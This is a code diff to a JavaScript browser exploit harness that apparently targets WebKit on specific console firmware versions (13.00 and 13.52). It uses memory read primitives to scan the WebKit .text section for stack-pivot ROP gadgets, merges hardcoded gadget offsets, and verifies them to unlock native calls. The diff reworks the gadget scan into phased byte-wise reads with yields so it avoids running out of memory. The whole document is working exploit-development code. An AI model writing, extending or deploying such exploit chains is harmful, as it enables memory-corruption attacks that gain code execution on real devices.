@@ -4,6 +4,8 @@ import { installWindowP, pairStatus } from "./mem.js";
 import { groomBootLine, wireGroomBar } from "./groom_presets.js";
 import {
     PIVOT_HINTS_1300,
+    PIVOT_HW_1352,
+    pivotHint,
     PIVOT_ROWS,
     pivotPattern,
     verifyPivotSet,
@@ -13,14 +15,17 @@ import {
 } from "./pivot_gadgets.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250828b";
+const BUILD_ID = "rw-20250828d";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const RESTORE_LOG = params.get("restorelog") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
+/** Scan low .text first — MOV @ +0x1f9bb; 13.00 hints @ +0x295f… are wrong on 13.52 */
+const SCAN_LOW_MAX = parseInt(params.get("scanlowmax") || "800000", 16);
 const SCAN_PIVOT_MAX = parseInt(params.get("scanmax") || "4800000", 16);
-const SCAN_NEAR_RADIUS = parseInt(params.get("scanrad") || "20000", 16);
-const SCAN_CHUNK = parseInt(params.get("scanchunk") || "2048", 10);
+const SCAN_NEAR_RADIUS = parseInt(params.get("scanrad") || "8000", 16);
+const SCAN_CHUNK = parseInt(params.get("scanchunk") || "256", 10);
+const SCAN_YIELD_EVERY = parseInt(params.get("scanyield") || "32", 10);
 const ELF_MAGIC = 0x464c457f;
 const SYS_GETPID = 20;
 const HW_GADGETS_1352 = {
@@ -378,7 +383,7 @@ function runManualTest(testId) {
     if (test.spKey && off.pivot_view_sp != null)
         pat = [0x48, 0x8b, 0x50, off.pivot_view_sp & 0xff];
     if (rva == null && test.group === "pivot") {
-        const hint = PIVOT_HINTS_1300[test.key];
+        const hint = pivotHint(test.key);
         if (hint != null) {
             const g = checkPat(p, webkitBase, hint, pat);
             mark(g.ok ? "GADGET-OK" : "GADGET-BAD",
@@ -595,7 +600,7 @@ function loadEffectiveOff() {
         const cal = sessionStorage.getItem("wk-calibrated");
         if (cal) off = Object.assign(off, JSON.parse(cal));
     } catch (_) { }
-    off = Object.assign(off, HW_GADGETS_1352);
+    off = Object.assign(off, HW_GADGETS_1352, PIVOT_HW_1352);
     const scanned = loadScannedPivot();
     if (scanned) off = mergeScannedPivot(off, scanned);
     if (off.pivot_view_sp == null)
@@ -603,38 +608,17 @@ function loadEffectiveOff() {
     return off;
 }
 
-function bytesFromRead8(w) {
-    const out = [];
-    let v = w.low >>> 0;
-    for (let i = 0; i < 4; i++) {
-        out.push(v & 0xff);
-        v >>>= 8;
+function pivotScanRange(key, phase) {
+    if (phase === "low") {
+        return { minRva: SCAN_PIVOT_MIN, maxRva: SCAN_LOW_MAX };
     }
-    v = w.hi >>> 0;
-    for (let i = 0; i < 4; i++) {
-        out.push(v & 0xff);
-        v >>>= 8;
+    const hint = pivotHint(key);
+    if (hint > 0 && hint < SCAN_LOW_MAX) {
+        return {
+            minRva: Math.max(SCAN_PIVOT_MIN, hint - SCAN_NEAR_RADIUS),
+            maxRva: Math.min(SCAN_LOW_MAX, hint + SCAN_NEAR_RADIUS),
+        };
     }
-    return out;
-}
-
-function matchPatAt(bytes, startOff, pat) {
-    for (let i = 0; i < pat.length; i++) {
-        if (pat[i] === null) continue;
-        if ((bytes[startOff + i] & 0xff) !== pat[i]) return false;
-    }
-    return true;
-}
-
-function findPatInRead8(bytes, pat) {
-    for (let start = 0; start < 8; start++) {
-        if (matchPatAt(bytes, start, pat)) return start;
-    }
-    return -1;
-}
-
-function pivotScanRange(key) {
-    const hint = PIVOT_HINTS_1300[key] || 0;
     if (hint > 0) {
         return {
             minRva: Math.max(SCAN_PIVOT_MIN, hint - SCAN_NEAR_RADIUS),
@@ -642,6 +626,37 @@ function pivotScanRange(key) {
         };
     }
     return { minRva: SCAN_PIVOT_MIN, maxRva: SCAN_PIVOT_MIN + SCAN_NEAR_RADIUS * 2 };
+}
+
+function pivotScanFoundInit() {
+    const found = Object.assign({}, PIVOT_HW_1352);
+    const saved = loadScannedPivot();
+    if (saved) Object.assign(found, saved);
+    return found;
+}
+
+function scanPatRead1(p, base, rva, pat) {
+    for (let i = 0; i < pat.length; i++) {
+        if (pat[i] === null) continue;
+        const b = read1p(p, base.add32(rva + i));
+        if (b == null || (b & 0xff) !== pat[i]) return false;
+    }
+    return true;
+}
+
+function pivotRowDone(found, key) {
+    return found[key] != null || PIVOT_HW_1352[key] != null;
+}
+
+function advancePivotRowIdx(pivotScan) {
+    while (pivotScan.rowIdx < PIVOT_ROWS.length) {
+        const key = PIVOT_ROWS[pivotScan.rowIdx][1];
+        if (!pivotRowDone(pivotScan.found, key)) return false;
+        pivotScan.rowIdx++;
+        pivotScan.cursor = null;
+        pivotScan.phase = "low";
+    }
+    return true;
 }
 
 function loadPivotScanState(base) {
@@ -678,77 +693,77 @@ async function scanPivotChunk() {
                 base: String(webkitBase),
                 rowIdx: 0,
                 cursor: null,
-                found: loadScannedPivot() || {},
+                phase: "low",
+                found: pivotScanFoundInit(),
             };
         }
+        pivotScan.found = Object.assign(pivotScanFoundInit(), pivotScan.found);
 
-        while (pivotScan.rowIdx < PIVOT_ROWS.length) {
-            const row = PIVOT_ROWS[pivotScan.rowIdx];
-            const key = row[1];
-            if (pivotScan.found[key] != null) {
-                pivotScan.rowIdx++;
-                pivotScan.cursor = null;
-                continue;
-            }
-
-            const pat = pivotPattern(row, off);
-            const range = pivotScanRange(key);
-            let rva = pivotScan.cursor != null ? pivotScan.cursor : (range.minRva & ~7);
-            let steps = 0;
-            let hit = null;
-            const hint = PIVOT_HINTS_1300[key] || 0;
-
-            while (rva < range.maxRva && steps < SCAN_CHUNK) {
-                const w = read8p(p, webkitBase.add32(rva));
-                if (w) {
-                    const offIn = findPatInRead8(bytesFromRead8(w), pat);
-                    if (offIn >= 0) {
-                        const cand = rva + offIn;
-                        if (hit == null || Math.abs(cand - hint) < Math.abs(hit - hint))
-                            hit = cand;
-                    }
-                }
-                rva += 8;
-                steps++;
-            }
-
-            pivotScan.cursor = rva;
+        if (advancePivotRowIdx(pivotScan)) {
+            mark("SCAN-DONE", "all pivot rows done — tap Verify pivot");
             savePivotScanState(pivotScan);
-
-            if (hit != null) {
-                pivotScan.found[key] = hit;
-                saveScannedPivot(webkitBase, pivotScan.found);
-                mark("SCAN-HIT", row[0] + " +0x" + hit.toString(16)
-                    + (hint ? " (hint +0x" + hint.toString(16) + ")" : ""));
-                pivotScan.rowIdx++;
-                pivotScan.cursor = null;
-                savePivotScanState(pivotScan);
-                const v = updatePivotReady(p, loadEffectiveOff());
-                if (v && v.ok)
-                    mark("PIVOT-READY", "all " + v.total + " pivot gadgets verified — Native call unlocked");
-                setUi();
-                return;
-            }
-
-            if (rva >= range.maxRva) {
-                mark("SCAN-MISS", row[0] + " not found near hint +0x"
-                    + (hint ? hint.toString(16) : "?"));
-                pivotScan.rowIdx++;
-                pivotScan.cursor = null;
-                savePivotScanState(pivotScan);
-                return;
-            }
-
-            mark("SCAN-PROG", row[0] + " @+0x" + rva.toString(16)
-                + " (" + steps + " steps, row " + (pivotScan.rowIdx + 1)
-                + "/" + PIVOT_ROWS.length + ")");
             return;
         }
 
-        mark("SCAN-DONE", "all pivot rows processed — tap Verify pivot");
-        const v = updatePivotReady(p, loadEffectiveOff());
-        if (v && v.ok)
-            mark("PIVOT-READY", "all pivot gadgets verified");
+        const row = PIVOT_ROWS[pivotScan.rowIdx];
+        const key = row[1];
+        const label = row[0];
+        const pat = pivotPattern(row, off);
+        if (!pivotScan.phase) pivotScan.phase = "low";
+        const range = pivotScanRange(key, pivotScan.phase);
+        let rva = pivotScan.cursor != null ? pivotScan.cursor : (range.minRva & ~3);
+        let steps = 0;
+        let hit = null;
+        const hint = pivotHint(key);
+
+        while (rva < range.maxRva && steps < SCAN_CHUNK) {
+            if (scanPatRead1(p, webkitBase, rva, pat)) {
+                if (hit == null || (hint > 0 && Math.abs(rva - hint) < Math.abs(hit - hint)))
+                    hit = rva;
+            }
+            rva += 4;
+            steps++;
+            if ((steps & (SCAN_YIELD_EVERY - 1)) === 0)
+                await new Promise(r => setTimeout(r, 0));
+        }
+
+        pivotScan.cursor = rva;
+        savePivotScanState(pivotScan);
+
+        if (hit != null) {
+            pivotScan.found[key] = hit;
+            saveScannedPivot(webkitBase, pivotScan.found);
+            mark("SCAN-HIT", label + " +0x" + hit.toString(16)
+                + " phase=" + pivotScan.phase
+                + (hint ? " hint=+0x" + hint.toString(16) : ""));
+            pivotScan.rowIdx++;
+            pivotScan.cursor = null;
+            pivotScan.phase = "low";
+            savePivotScanState(pivotScan);
+            mark("SCAN-NEXT", "tap again for next gadget (one row per tap — OOM safe)");
+            return;
+        }
+
+        if (rva >= range.maxRva) {
+            if (pivotScan.phase === "low") {
+                pivotScan.phase = "hint";
+                pivotScan.cursor = null;
+                savePivotScanState(pivotScan);
+                mark("SCAN-PHASE", label + " low .text miss — retrying near 13.00 hint");
+                return;
+            }
+            mark("SCAN-MISS", label + " not found (low + hint) — paste RVA if you find on HW");
+            pivotScan.rowIdx++;
+            pivotScan.cursor = null;
+            pivotScan.phase = "low";
+            savePivotScanState(pivotScan);
+            return;
+        }
+
+        mark("SCAN-PROG", label + " phase=" + pivotScan.phase
+            + " @+0x" + rva.toString(16)
+            + " (" + steps + "/" + SCAN_CHUNK + " row " + (pivotScan.rowIdx + 1)
+            + "/" + PIVOT_ROWS.length + ")");
     } finally {
         busy = false;
         setUi();
@@ -1191,6 +1206,14 @@ function init() {
             if (!(i >= 0) || !pointers[i]) return;
             addrIn.value = pointers[i].addr.replace(/^0x/i, "");
         });
+    }
+
+    if (params.get("clearpivot") === "1") {
+        try {
+            sessionStorage.removeItem("wk-pivot-scan-state");
+            sessionStorage.removeItem("wk-scanned-pivot");
+            sessionStorage.removeItem("wk-scanned-pivot-base");
+        } catch (_) { }
     }
 
     if (params.get("clearlog") === "1") clearPersistedLog();
